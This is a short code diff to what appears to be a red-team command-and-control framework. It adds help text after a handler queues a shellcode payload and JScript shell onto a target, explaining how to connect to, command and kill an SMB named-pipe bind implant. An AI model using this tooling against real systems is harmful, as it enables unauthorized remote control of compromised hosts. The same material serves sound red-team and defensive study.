@@ -238,6 +238,17 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, "")), user, randomuri)
         cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
         new_task(cmd, user, randomuri)
+        target = re.search("(?<=-target )\\S*", str(cmd), re.IGNORECASE)
+        C2 = get_c2server_all()
+        print()
+        print("To connect to the SMB named pipe use the following command:")
+        print(Colours.GREEN+"invoke-pbind -target %s -secret mtkn4 -key %s -pname jaccdpqnvbrrxlaf -client" % (target[0],C2[2])+Colours.END)
+        print()
+        print("To issue commands to the SMB named pipe use the follwoing command:")
+        print(Colours.GREEN+"pbind-command \"pwd\""+Colours.END)
+        print()
+        print("To kill the SMB named pipe use the follwoing command:")
+        print(Colours.GREEN+"pbind-kill"+Colours.END)
 
     elif command.startswith("invoke-wmijsproxypayload"):
         check_module_loaded("New-JScriptShell.ps1", randomuri, user)
